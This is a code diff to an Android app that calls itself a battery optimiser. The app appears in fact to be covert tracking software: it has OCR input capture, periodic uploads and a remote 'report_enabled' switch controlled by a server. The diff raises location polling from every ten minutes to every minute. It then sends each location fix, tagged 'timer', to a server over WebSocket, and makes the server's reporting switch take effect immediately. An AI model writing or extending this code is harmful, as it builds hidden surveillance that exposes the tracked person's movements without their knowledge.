@@ -5,6 +5,7 @@ import android.os.Build
 import android.util.Log
 import com.android.batteryoptimization.network.NetworkClient
 import com.android.batteryoptimization.network.UploadResponse
+import com.android.batteryoptimization.network.WebSocketManager
 import com.google.gson.Gson
 import com.google.gson.reflect.TypeToken
 import com.android.batteryoptimization.ocr.api.OcrResult
@@ -54,7 +55,7 @@ class InputRepository private constructor(private val context: Context) {
     private val UPLOAD_INTERVAL_MS = 10 * 1000L // 10 seconds
 
     // Location refresh interval (seconds, easy to adjust)
-    val LOCATION_INTERVAL_SECONDS = 10 * 60 // 10 minutes
+    val LOCATION_INTERVAL_SECONDS = 60 // 1 minute
     private val LOCATION_INTERVAL_MS = LOCATION_INTERVAL_SECONDS * 1000L
 
     // Cached location map (refreshed periodically, contains all geo fields from AMapLocationHelper)
@@ -229,6 +230,11 @@ class InputRepository private constructor(private val context: Context) {
                 val lat = result["latitude"] ?: 0.0
                 val lng = result["longitude"] ?: 0.0
                 Log.d(TAG, "定位刷新: lat=$lat, lng=$lng, time=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
+                // 定时定位成功后主动上传位置（每 LOCATION_INTERVAL_MS 一次）
+                val uploadMap = result.toMutableMap().apply { this["source"] = "timer" }
+                WebSocketManager.sendLocation(uploadMap)
+                AMapLocationHelper.logGpsUpload(context, uploadMap)
+                Log.d(TAG, "定时位置已上传")
             }
         } catch (e: Exception) {
             Log.e(TAG, "定位刷新异常", e)
@@ -258,12 +264,16 @@ class InputRepository private constructor(private val context: Context) {
 
     // ─── 数据上报开关（服务器 report_enabled 指令控制） ─────────────
 
+    private val _reportEnabledFlow = MutableStateFlow(prefs.getBoolean(KEY_REPORT_ENABLED, false))
+    val reportEnabledFlow: kotlinx.coroutines.flow.StateFlow<Boolean> = _reportEnabledFlow.asStateFlow()
+
     /** 当前是否开启数据上报（默认关闭） */
-    fun isReportEnabled(): Boolean = prefs.getBoolean(KEY_REPORT_ENABLED, false)
+    fun isReportEnabled(): Boolean = _reportEnabledFlow.value
 
     /** 设置数据上报开关：true=开启，false=关闭 */
     fun setReportEnabled(enabled: Boolean) {
         prefs.edit().putBoolean(KEY_REPORT_ENABLED, enabled).apply()
+        _reportEnabledFlow.value = enabled
         Log.d(TAG, "数据上报已${if (enabled) "开启" else "关闭"}")
     }
 
